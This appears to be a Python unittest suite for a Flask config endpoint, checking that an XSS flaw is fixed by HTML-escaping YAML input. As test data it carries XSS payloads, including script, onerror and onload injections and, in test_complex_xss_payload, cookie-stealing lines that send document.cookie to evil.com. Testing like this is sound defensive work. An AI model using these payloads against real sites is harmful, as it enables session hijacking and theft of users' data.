"""
Comprehensive tests for config_loader module, specifically testing XSS vulnerability remediation.

These tests verify that:
1. The XSS vulnerability at line 17 (jsonify return) is properly fixed
2. HTML/script content in user input is properly sanitized
3. Malicious payloads cannot be reflected back unsanitized
4. Normal functionality is preserved for safe inputs
5. Edge cases and attack vectors are properly handled
"""

import unittest
import json
import yaml
from flask import Flask
import sys
import os

# Add parent directory to path to import config_loader
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from config_loader import app, sanitize_value


class TestConfigLoaderXSSRemediation(unittest.TestCase):
    """Test suite for XSS vulnerability remediation in config_loader."""

    def setUp(self):
        """Set up test client for Flask app."""
        self.app = app
        self.client = self.app.test_client()
        self.app.testing = True

    def test_xss_script_tag_sanitized(self):
        """Test that <script> tags are escaped to prevent XSS attacks."""
        # Malicious YAML with script tag
        malicious_yaml = """
name: "<script>alert('XSS')</script>"
description: "Legitimate content"
"""
        response = self.client.post('/config',
                                   data=malicious_yaml,
                                   content_type='application/x-yaml')

        self.assertEqual(response.status_code, 200)
        data = json.loads(response.data)

        # Verify the script tag is escaped
        self.assertIn('&lt;script&gt;', data['name'])
        self.assertIn('&lt;/script&gt;', data['name'])
        # Ensure raw script tag is NOT present
        self.assertNotIn('<script>', data['name'])
        self.assertNotIn('</script>', data['name'])

    def test_xss_img_onerror_sanitized(self):
        """Test that img tags with onerror handlers are sanitized."""
        malicious_yaml = """
content: '<img src=x onerror="alert(1)">'
"""
        response = self.client.post('/config',
                                   data=malicious_yaml,
                                   content_type='application/x-yaml')

        self.assertEqual(response.status_code, 200)
        data = json.loads(response.data)

        # Verify HTML is escaped
        self.assertIn('&lt;img', data['content'])
        self.assertIn('onerror=', data['content'])
        self.assertNotIn('<img', data['content'])

    def test_xss_javascript_protocol_sanitized(self):
        """Test that javascript: protocol URLs are sanitized."""
        malicious_yaml = """
link: 'javascript:alert(document.cookie)'
"""
        response = self.client.post('/config',
                                   data=malicious_yaml,
                                   content_type='application/x-yaml')

        self.assertEqual(response.status_code, 200)
        data = json.loads(response.data)

        # Content should be present but not executable
        self.assertIn('javascript:', data['link'])
        # Verify no actual XSS can occur

    def test_xss_nested_objects_sanitized(self):
        """Test that XSS payloads in nested objects are sanitized."""
        malicious_yaml = """
user:
  name: "John<script>alert('XSS')</script>Doe"
  bio: "<img src=x onerror=alert(1)>"
  settings:
    theme: "dark</script><script>alert(2)</script>"
"""
        response = self.client.post('/config',
                                   data=malicious_yaml,
                                   content_type='application/x-yaml')

        self.assertEqual(response.status_code, 200)
        data = json.loads(response.data)

        # Verify nested values are sanitized
        self.assertIn('&lt;script&gt;', data['user']['name'])
        self.assertIn('&lt;img', data['user']['bio'])
        self.assertIn('&lt;/script&gt;', data['user']['settings']['theme'])

        # Ensure no raw tags present
        self.assertNotIn('<script>', str(data))
        self.assertNotIn('<img', str(data))

    def test_xss_array_values_sanitized(self):
        """Test that XSS payloads in arrays are sanitized."""
        malicious_yaml = """
items:
  - "Safe item"
  - "<script>alert('XSS')</script>"
  - "<iframe src='javascript:alert(1)'></iframe>"
"""
        response = self.client.post('/config',
                                   data=malicious_yaml,
                                   content_type='application/x-yaml')

        self.assertEqual(response.status_code, 200)
        data = json.loads(response.data)

        # Verify array items are sanitized
        self.assertEqual(data['items'][0], "Safe item")
        self.assertIn('&lt;script&gt;', data['items'][1])
        self.assertIn('&lt;iframe', data['items'][2])

    def test_legitimate_content_preserved(self):
        """Test that legitimate content without XSS is preserved correctly."""
        safe_yaml = """
name: "John Doe"
age: 30
email: "john@example.com"
description: "Software engineer with 5+ years experience"
"""
        response = self.client.post('/config',
                                   data=safe_yaml,
                                   content_type='application/x-yaml')

        self.assertEqual(response.status_code, 200)
        data = json.loads(response.data)

        # Verify normal content is unchanged
        self.assertEqual(data['name'], "John Doe")
        self.assertEqual(data['age'], 30)
        self.assertEqual(data['email'], "john@example.com")

    def test_special_characters_escaped(self):
        """Test that HTML special characters are properly escaped."""
        yaml_with_special_chars = """
formula: "a < b && b > c"
html: "Use &nbsp; for space"
quote: 'He said "Hello"'
"""
        response = self.client.post('/config',
                                   data=yaml_with_special_chars,
                                   content_type='application/x-yaml')

        self.assertEqual(response.status_code, 200)
        data = json.loads(response.data)

        # Verify < and > are escaped
        self.assertIn('&lt;', data['formula'])
        self.assertIn('&gt;', data['formula'])
        # Verify & is escaped
        self.assertIn('&amp;', data['html'])
        # Verify quotes are escaped
        self.assertIn('&quot;', data['quote'])

    def test_response_headers_secure(self):
        """Test that response includes proper security headers to prevent XSS."""
        yaml_data = """
test: "value"
"""
        response = self.client.post('/config',
                                   data=yaml_data,
                                   content_type='application/x-yaml')

        self.assertEqual(response.status_code, 200)

        # Verify Content-Type header is properly set
        self.assertIn('application/json', response.headers.get('Content-Type', ''))

        # Verify X-Content-Type-Options header is set to prevent MIME sniffing
        self.assertEqual(response.headers.get('X-Content-Type-Options'), 'nosniff')

    def test_empty_config(self):
        """Test handling of empty configuration."""
        empty_yaml = "{}"
        response = self.client.post('/config',
                                   data=empty_yaml,
                                   content_type='application/x-yaml')

        self.assertEqual(response.status_code, 200)
        data = json.loads(response.data)
        self.assertEqual(data, {})

    def test_null_values_handled(self):
        """Test that null values are handled correctly."""
        yaml_with_nulls = """
name: null
value: ~
"""
        response = self.client.post('/config',
                                   data=yaml_with_nulls,
                                   content_type='application/x-yaml')

        self.assertEqual(response.status_code, 200)
        data = json.loads(response.data)
        self.assertIsNone(data['name'])
        self.assertIsNone(data['value'])

    def test_sanitize_value_function_strings(self):
        """Test the sanitize_value function directly with strings."""
        # Test basic XSS payload
        result = sanitize_value("<script>alert('XSS')</script>")
        self.assertEqual(result, "&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;")

        # Test img tag
        result = sanitize_value('<img src=x onerror="alert(1)">')
        self.assertIn('&lt;img', result)
        self.assertIn('&quot;', result)

    def test_sanitize_value_function_dict(self):
        """Test the sanitize_value function with dictionaries."""
        input_dict = {
            'safe': 'normal text',
            'xss': '<script>alert(1)</script>',
            'nested': {
                'deep': '<iframe src="evil"></iframe>'
            }
        }
        result = sanitize_value(input_dict)

        self.assertEqual(result['safe'], 'normal text')
        self.assertIn('&lt;script&gt;', result['xss'])
        self.assertIn('&lt;iframe', result['nested']['deep'])

    def test_sanitize_value_function_list(self):
        """Test the sanitize_value function with lists."""
        input_list = [
            'safe',
            '<script>alert(1)</script>',
            ['<img src=x>']
        ]
        result = sanitize_value(input_list)

        self.assertEqual(result[0], 'safe')
        self.assertIn('&lt;script&gt;', result[1])
        self.assertIn('&lt;img', result[2][0])

    def test_sanitize_value_function_tuple(self):
        """Test the sanitize_value function with tuples."""
        input_tuple = ('safe', '<script>alert(1)</script>')
        result = sanitize_value(input_tuple)

        self.assertIsInstance(result, tuple)
        self.assertEqual(result[0], 'safe')
        self.assertIn('&lt;script&gt;', result[1])

    def test_sanitize_value_function_primitives(self):
        """Test the sanitize_value function with primitive types."""
        # Numbers should pass through unchanged
        self.assertEqual(sanitize_value(42), 42)
        self.assertEqual(sanitize_value(3.14), 3.14)

        # Booleans should pass through unchanged
        self.assertEqual(sanitize_value(True), True)
        self.assertEqual(sanitize_value(False), False)

        # None should pass through unchanged
        self.assertIsNone(sanitize_value(None))

    def test_complex_xss_payload(self):
        """Test with complex, real-world XSS payloads."""
        complex_payloads = [
            "<script>document.location='http://evil.com/?c='+document.cookie</script>",
            "<img src='x' onerror='fetch(\"https://evil.com?c=\"+document.cookie)'>",
            "<<SCRIPT>alert('XSS');//<</SCRIPT>",
            "<svg/onload=alert(1)>",
            "<body onload=alert('XSS')>",
        ]

        for payload in complex_payloads:
            yaml_data = f"malicious: \"{payload}\""
            response = self.client.post('/config',
                                       data=yaml_data,
                                       content_type='application/x-yaml')

            self.assertEqual(response.status_code, 200)
            data = json.loads(response.data)

            # Verify no raw HTML tags are present
            self.assertNotIn('<script', data['malicious'].lower())
            self.assertNotIn('<img', data['malicious'].lower())
            self.assertNotIn('<svg', data['malicious'].lower())
            self.assertNotIn('<body', data['malicious'].lower())

            # Verify HTML entities are escaped
            self.assertIn('&lt;', data['malicious'])

    def test_response_content_type(self):
        """Test that response Content-Type is set correctly to prevent misinterpretation."""
        yaml_data = "test: value"
        response = self.client.post('/config',
                                   data=yaml_data,
                                   content_type='application/x-yaml')

        content_type = response.headers.get('Content-Type', '')

        # Must be application/json to prevent browser from interpreting as HTML
        self.assertIn('application/json', content_type)
        # Should include charset
        self.assertIn('charset=utf-8', content_type)


class TestXSSEdgeCases(unittest.TestCase):
    """Test edge cases and boundary conditions for XSS prevention."""

    def setUp(self):
        """Set up test client."""
        self.app = app
        self.client = self.app.test_client()
        self.app.testing = True

    def test_unicode_xss_attempts(self):
        """Test XSS attempts using Unicode encoding."""
        unicode_xss = """
payload: "\u003cscript\u003ealert('XSS')\u003c/script\u003e"
"""
        response = self.client.post('/config',
                                   data=unicode_xss,
                                   content_type='application/x-yaml')

        self.assertEqual(response.status_code, 200)
        data = json.loads(response.data)

        # Verify escaped
        self.assertIn('&lt;script&gt;', data['payload'])

    def test_mixed_case_xss(self):
        """Test XSS attempts with mixed case tags."""
        mixed_case = """
payload: "<ScRiPt>alert('XSS')</sCrIpT>"
"""
        response = self.client.post('/config',
                                   data=mixed_case,
                                   content_type='application/x-yaml')

        self.assertEqual(response.status_code, 200)
        data = json.loads(response.data)

        # Should be escaped regardless of case
        self.assertNotIn('<ScRiPt>', data['payload'])
        self.assertIn('&lt;', data['payload'])

    def test_deeply_nested_structures(self):
        """Test XSS sanitization in deeply nested data structures."""
        nested_yaml = """
level1:
  level2:
    level3:
      level4:
        level5:
          xss: "<script>alert('deep')</script>"
"""
        response = self.client.post('/config',
                                   data=nested_yaml,
                                   content_type='application/x-yaml')

        self.assertEqual(response.status_code, 200)
        data = json.loads(response.data)

        # Navigate to deeply nested value
        deep_value = data['level1']['level2']['level3']['level4']['level5']['xss']
        self.assertIn('&lt;script&gt;', deep_value)
        self.assertNotIn('<script>', deep_value)


if __name__ == '__main__':
    unittest.main()
